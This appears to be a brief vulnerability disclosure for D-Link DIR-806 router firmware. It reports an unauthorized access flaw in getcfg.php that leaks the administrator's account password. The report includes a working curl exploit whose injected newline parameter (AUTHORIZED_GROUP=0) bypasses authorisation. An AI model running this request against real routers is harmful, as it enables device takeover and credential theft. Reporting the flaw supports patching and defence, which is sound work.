Manufacturer: D-Link
Official Website: https://www.dlink.com.cn/
Product: D-Link DIR-806 Series Routers
Product Model: DIR806A1_FW100CNb11
Reporter: clxhzg

Vulnerability Description:
The D-Link DIR-806 has an unauthorized access vulnerability. Attackers can directly obtain key information such as the administrator's account password via getcfg.php, thereby gaining administrator privileges.

Attack:
```
curl -X GET "http://192.168.0.1:80/getcfg.php" 
-H "Content-Type: application/x-www-form-urlencoded" 
--data "Z=Z%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d0"
```

<img width="719" height="429" alt="image" src="https://github.com/user-attachments/assets/201bd3b7-b9ad-4f49-8c37-ae95cbfc1b9f" />
